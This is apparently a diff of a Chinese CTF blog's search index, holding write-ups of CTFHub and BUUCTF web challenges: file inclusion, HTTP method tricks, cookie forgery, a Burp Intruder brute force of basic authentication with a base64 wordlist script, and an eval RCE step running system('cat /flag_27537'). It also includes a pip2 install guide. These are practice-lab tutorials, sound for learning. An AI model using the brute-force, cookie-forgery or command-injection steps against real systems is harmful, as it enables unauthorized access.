+<p>然后在改包的里面完成操作，读取next.php文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220915984.png"
+                      alt="image-20240914220915984"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221658927.png"
+                      alt="image-20240914221658927"
+                ></p>
+<p>取出这串字符，用Base64解码即可得到next.php文件，提供一个在线解码工具<a class="link"   href="https://www.toolhelper.cn/EncodeDecode/Base64" >锤子 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221848920.png"
+                      alt="image-20240914221848920"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221833561.png"
+                      alt="image-20240914221833561"
+                ></p>
+<blockquote>
+<p>之后的代码审计暂时不做，留个坑在这</p>
+</blockquote>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里需要掌握php的文件包含的知识，如果觉得自己不够掌握的推荐看一下<a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/105839776" >PHP文件包含漏洞利用思路与Bypass总结手册 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，这里面基本涵盖了所有的情况，耐心阅读吧~</p>
+<p><a class="link"   href="https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>writeup</category>
+        <category>web</category>
+        <category>buuctf</category>
+      </categories>
+      <tags>
+        <tag>待填坑</tag>
+        <tag>writeup</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web前置技能-HTTP协议</title>
+    <url>/2024/09/15/ctf/writeup/web/ctfhub/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h1 id="web前置技能-HTTP协议"><a href="#web前置技能-HTTP协议" class="headerlink" title="web前置技能-HTTP协议"></a>web前置技能-HTTP协议</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><div class="tabs" id="tab-web前置技能-http协议"><ul class="nav-tabs"><li class="tab active"><a class="#web前置技能-http协议-1">题目-请求方式</a></li><li class="tab"><a class="#web前置技能-http协议-2">题目-302跳转</a></li><li class="tab"><a class="#web前置技能-http协议-3">题目-Cookie</a></li><li class="tab"><a class="#web前置技能-http协议-4">题目-基础认证</a></li><li class="tab"><a class="#web前置技能-http协议-5">题目-响应包源代码</a></li></ul><div class="tab-content"><div class="tab-pane active" id="web前置技能-http协议-1"><h3 id="题目-请求方式"><a href="#题目-请求方式" class="headerlink" title="题目-请求方式"></a>题目-请求方式</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源</p>
+
+  </div>
+
+<p>打开靶场，根据题目需要入手的是HTTP的请求方式</p>
+<p>看到网页上显示HTTP的提交方式是<code>CTFHUB</code>就会给我们flag，然后下面一行提示表示需要用<code>index.php</code>请求</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915202012505.png"
+                      alt="image-20240915202012505"
+                ></p>
+<p>因为原页面就是<code>index.php</code>请求，所以直接抓包即可</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915202702082.png"
+                      alt="image-20240915202702082"
+                ></p>
+<p>然后<code>GET</code>改为<code>CTFHUB</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915203925037.png"
+                      alt="image-20240915203925037"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915203939085.png"
+                      alt="image-20240915203939085"
+                ></p>
+<p>这样flag就直接出来了，确实是前置技能哈哈哈(ฅ´ω&#96;ฅ) </p></div><div class="tab-pane" id="web前置技能-http协议-2"><h3 id="题目-302跳转"><a href="#题目-302跳转" class="headerlink" title="题目-302跳转"></a>题目-302跳转</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>HTTP临时重定向</p>
+
+  </div>
+
+<p>题目中提示需要用到302临时重定向跳转</p>
+<blockquote>
+<p>在HTTP协议中，302 Found是一种临时重定向状态码，它表示请求的资源已经被临时移动到了由Location头部给出的URL。这个URL可能是新的位置，也可能是请求的资源的另一个版本。这个状态码的主要目的是将用户的请求重定向到新的URL，以便他们能够获得完整的资源。</p>
+</blockquote>
+<p>打开靶场，点击<code>Give me Flag</code>会发现一直只跳转到本网页，就说明确实需要配合重定向来结解题</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915204346059.png"
+                      alt="image-20240915204346059"
+                ></p>
+<p>先用F12（ctrl+U）大法看看网页源码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205115281.png"
+                      alt="image-20240915205115281"
+                ></p>
+<p>看到链接应该是<code>Index.php</code>，但每次点击都只会跳转到<code>index.html</code>，只需要临时抓包不放包就可以防止网页302</p>
+<p>点击链接，我们用BP抓包，再发送给repeater（可以理解为发送包后又临时抓包但不返回到浏览器页面的功能）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205435134.png"
+                      alt="image-20240915205435134"
+                ></p>
+<p>可以看到send后是一个302的请求，所以才会被重定向</p>
+<p>通过查询，还有另一种方式就是cmd命令里的curl命令</p>
+<p>在cmd中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v http://challenge-62083e00fdc21e52.sandbox.ctfhub.com:10800/index.php</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
-<p>记得要在命令末尾加上;</p>
+<p>注意是原本的网页.php</p>
 </blockquote>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914224936330.png"
-                      alt="image-20240914224936330"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205703202.png"
+                      alt="image-20240915205703202"
                 ></p>
-<p>发现目录下面有<code>flag_27537</code>这样的文件，打开看看</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;cat /flag_27537&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<p>然后就会返回原本的文件头，而不会被浏览器解析</p>
+<p><a class="link"   href="https://blog.csdn.net/u013514928/article/details/102810250" >curl命令用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></div><div class="tab-pane" id="web前置技能-http协议-3"><h3 id="题目-Cookie"><a href="#题目-Cookie" class="headerlink" title="题目-Cookie"></a>题目-Cookie</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>Cookie欺骗、认证、伪造</p>
+
+  </div>
+
+<p>打开靶场看到提示只有<code>admin</code>能够拿到flag，再根据题目是cookie的伪造，所以这道题从cookie下手</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005118438.png"
+                      alt="image-20240916005118438"
+                ></p>
+<p>用BP抓包看看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005704097.png"
+                      alt="image-20240916005704097"
+                ></p>
+<p>很明显的看到cookie里面的admin为0，那把它改为1不就成了吗，恭喜，这道题你做出来了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005755371.png"
+                      alt="image-20240916005755371"
+                ></p></div><div class="tab-pane" id="web前置技能-http协议-4"><h3 id="题目-基础认证"><a href="#题目-基础认证" class="headerlink" title="题目-基础认证"></a>题目-基础认证</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a class="link"   href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81" >https://zh.wikipedia.org/wiki/HTTP基本认证 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+  </div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914225035612.png"
-                      alt="image-20240914225035612"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005910601.png"
+                      alt="image-20240916005910601"
                 ></p>
-<p>好家伙flag直接出来了</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以看到eval执行的恐怖了吧，直接对服务器进行命令行操作，自己有项目时一定要慎用，要用也要做好防范措施</p>
-<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;RCE-&gt;eval执行</p>
+<p>这道题给了我们一个附件，打开附件是一串字符，加上题目可以合理推测是用基础爆破来解题</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010010509.png"
+                      alt="image-20240916010010509"
+                ></p>
+<p>打开靶场看到有链接，直接点开会，会弹出一个验证框叫我们输入账号密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010021706.png"
+                      alt="image-20240916010021706"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010747334.png"
+                      alt="image-20240916010747334"
+                ></p>
+<p>直接抓包看看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010522890.png"
+                      alt="image-20240916010522890"
+                ></p>
+<p>然后返回包的头部有提到admin用户，所以后续猜测使用admin用户进行爆破</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020529442.png"
+                      alt="image-20240916020529442"
+                ></p>
+<p>里面有个<code>Authorization</code>，合理推断其值就是账号密码的加密形式，加密段的后面有<code>==</code>说明是<code>base64加密</code>，直接在线解密试试</p>
+<blockquote>
+<p>这里了解一下base64的加密规则，不够4个字节的用等号&#x3D;补充</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010723083.png"
+                      alt="image-20240916010723083"
+                ></p>
+<p>和我输入的账号密码一样，那么我们就可以开始爆破了</p>
+<blockquote>
+<p>后面是关于BP软件的使用，如果没有用过的可以当提前预知，之后可以慢慢学，先做了解</p>
+</blockquote>
+<ul>
+<li>先把数据包发送到<code>intruder</code></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011224974.png"
+                      alt="image-20240916011224974"
+                ></p>
+<ul>
+<li>先clear工具默认的爆破点位</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011343770.png"
+                      alt="image-20240916011343770"
+                ></p>
+<ul>
+<li>再选中字段添加爆破点</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011438064.png"
+                      alt="image-20240916011438064"
+                ></p>
+<ul>
+<li><p>选择sniper攻击方式，因为我们只有一个攻击点，只有密码字典，合理猜测账号是<code>admin</code></p>
+<div class="note-large red">
+  <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+    <p>BP攻击方式</p>
+
+  </div>
+  <div class="notel-content">
+    <p>Sniper 狙击手 – 只有一个攻击点</p></li>
+</ul>
+<p>Battering ram 攻城锤 – 两个攻击点，但传入的爆破参数相同</p>
+<p>Pitchfork 草叉 – 两个攻击点，传入两个爆破参数</p>
+<p>Cluster bomb 榴霰弹 – 具备前三种攻击方式，两个攻击点，爆破参数相互乘积即第二字典被反复使用或同一字典被反复使用（适合集中爆破–不清楚哪个该是密码还是账户）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916012324649.png"
+                      alt="image-20240916012324649"
+                ></p>
+
+<pre><code>&lt;/div&gt;
+</code></pre>
+  </div>
+  
+<p>  <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011533984.png"
+                      alt="image-20240916011533984"
+                ></p>
+<ul>
+<li>进入payloads页面传入字典</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916012520071.png"
+                      alt="image-20240916012520071"
+                ></p>
+<ul>
+<li><p>将密码的格式粘贴在这里</p>
+<details class="red" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>对于这个密码格式如何得到有多种方法 </summary>
+            <div class='content'>
+            <ol><li><p>用BP自带的功能，在<code>Payload Processing</code>的<code>Add</code>中的<code>Add Prefix</code>输入<code>admin:</code>，由于需要的是Base64加密，所以需要在下面对payload进行加密</p><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916021756299.png"
+                      alt="image-20240916021756299"
+                ></p><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916013852023.png"
+                      alt="image-20240916013852023"
+                ></p></li><li><p>用脚本直接一步到位，再复制到<code>paylaod settings</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base64.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            line=base64.b64encode(line.encode()).decode()</span><br><span class="line">            f.write(<span class="string">f&#x27;<span class="subst">&#123;line&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div></li></ol>
+            </div>
+          </details>
+</li>
+<li><p>然后就可以开始爆破了</p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916013923711.png"
+                      alt="image-20240916013923711"
+                ></p>
+<ul>
+<li>发现一个都跑不出来</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916014245240.png"
+                      alt="image-20240916014245240"
+                ></p>
+<blockquote>
+<p>网上有说是加密结果不能带有&#x3D;&#x3D;，其实并不是，只是因为在BP里面的&#x3D;会被转义而已，不要被误导了，不然你解一辈子都解不出来</p>
+<p>建议去看<a class="link"   href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html" >官方的writeup <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，我是测试了半天最后去看官方的，真的服了网上的某些帖子了&#x3D;_&#x3D;</p>
+</blockquote>
+<ul>
+<li>需要关闭下面的<code>URL-encode</code>，不然你会看到 base64 之后的 <code>=</code> 会被转成 <code>%3d</code> ，你就算爆破到天荒地老也不会出来</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/10imageslim.png"
+                      alt="img"
+                ></p>
+<ul>
+<li>再次<code>Start Attack</code>后，按 <code>Status</code> 排序，看到状态码出现<code>200</code>，即爆破成功</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020821868.png"
+                      alt="image-20240916020821868"
+                ></p>
+<ul>
+<li>可以看到下面正常返回了flag</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020835063.png"
+                      alt="image-20240916020835063"
+                ></p></div><div class="tab-pane" id="web前置技能-http协议-5"><h3 id="题目-响应包源代码"><a href="#题目-响应包源代码" class="headerlink" title="题目-响应包源代码"></a>题目-响应包源代码</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>HTTP响应包源代码查看</p>
+
+  </div>
+
+<p>打开靶场，根据题目要求我们查看源代码，靶场打开也是空白的，那就F12（ctrl+U）大法吧</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916022546590.png"
+                      alt="image-20240916022546590"
+                ></p>
+<p>然后就在源码里面很直白的告诉了你flag (๑•́ ₃•̀๑)  </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916022716123.png"
+                      alt="image-20240916022716123"
+                ></p></div></div></div>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一篇主要就是关于HTTP协议的几个点，从请求方式到网页响应码，再到cookie与加密认证，最后到网页源码，这些都是之后有可能遇到的小知识点，除了BP的使用可能比较困难，其他的确实算是入门级别的，继续加油吧，后面还有更有挑战性的题等着</p>
+
+  <div class="note p-4 mb-4 rounded-small red">
+    <p>不要放弃！！！有时候一道题做一天都有可能的！！！</p>
+
+  </div>
+
+<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;web前置技能-&gt;HTTP协议</p>
 ]]></content>
       <categories>
         <category>ctf</category>
@@ -1395,84 +1808,18 @@ import {initHBE} from "/js/plugins/hbe.js";
       </categories>
       <tags>
         <tag>writeup</tag>
-        <tag>rce</tag>
+        <tag>信息泄露</tag>
       </tags>
   </entry>
   <entry>
-    <title>kali环境下的pip2安装</title>
-    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/pip2%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<h1 id="pip2安装"><a href="#pip2安装" class="headerlink" title="pip2安装"></a>pip2安装</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>有些工具需要用到python2，但又需要pip下载包，而kali并没有自带pip2命令，所以需要手动安装pip2</strong></p>
-<h2 id="1、安装setuptools-18-5（路径随便）"><a href="#1、安装setuptools-18-5（路径随便）" class="headerlink" title="1、安装setuptools-18.5（路径随便）"></a><strong>1、安装setuptools-18.5</strong>（路径随便）</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz //安装文件包</span><br><span class="line">//（可能会比较慢，可以通过物理机下载后传进去）</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913222915609.png"
-                      alt="image-20240913222915609"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">//解压文件包然后进入目录</span><br><span class="line">tar -zxvf setuptools-18.5.tar.gz</span><br><span class="line"><span class="built_in">cd</span> setuptools-18.5/</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913222940730.png"
-                      alt="image-20240913222940730"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">//用root权限安装依赖</span><br><span class="line"><span class="built_in">sudo</span> python2 setup.py build</span><br><span class="line"><span class="built_in">sudo</span> python2 setup.py install</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913223123209.png"
-                      alt="image-20240913223123209"
-                ></p>
-<h2 id="2、安装pip2"><a href="#2、安装pip2" class="headerlink" title="2、安装pip2"></a>2、安装pip2</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py	//下载pip安装py包（可能会比较慢，可以通过物理机下载后传进去）</span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py  </span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913224726285.png"
-                      alt="image-20240913224726285"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913224913728.png"
-                      alt="image-20240913224913728"
-                ></p>
-<p><strong>此时可能会有报错，报错需要安装python2-dev（kali源已经更新的条件下）</strong></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install python2-dev</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>此时再执行<code>python2 get-pip.py</code>，就会继续安装</strong></p>
-<p><strong>安装过程中会有读取超时的报错则需反复多试几次则可成功运行</strong></p>
-<blockquote>
-<p>猜测是访问网络问题导致超时</p>
-</blockquote>
-<h2 id="3、使用pip2安装模块"><a href="#3、使用pip2安装模块" class="headerlink" title="3、使用pip2安装模块"></a>3、使用pip2安装模块</h2><p>更换pip源（不安装源，反复执行也行，但速度非常慢，安装后运行速度会大大提升）</p>
-<p>pip更新阿里云快速下载：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure></div>
-
-<p>pip更新清华源快速下载：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="更新后的pip安装命令"><a href="#更新后的pip安装命令" class="headerlink" title="更新后的pip安装命令"></a>更新后的pip安装命令</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 install impacket</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://blog.csdn.net/huayimy/article/details/128338899?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522188AE452-3D06-4121-8A1A-E9F40B09180A%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=188AE452-3D06-4121-8A1A-E9F40B09180A&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-128338899-null-null.nonecase&utm_term=pip2%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4450" >Kali Python2.7安装pip2和模块方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-      <categories>
-        <category>操作系统</category>
-        <category>kali</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-        <tag>环境配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息泄露-Git泄露-Log</title>
+    <title>信息泄露-Git泄露</title>
     <url>/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/</url>
     <content><![CDATA[<h1 id="信息泄露-Git泄露"><a href="#信息泄露-Git泄露" class="headerlink" title="信息泄露-Git泄露"></a>信息泄露-Git泄露</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
-<h2 id="题目-Log"><a href="#题目-Log" class="headerlink" title="题目-Log"></a>题目-Log</h2><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题。</p>
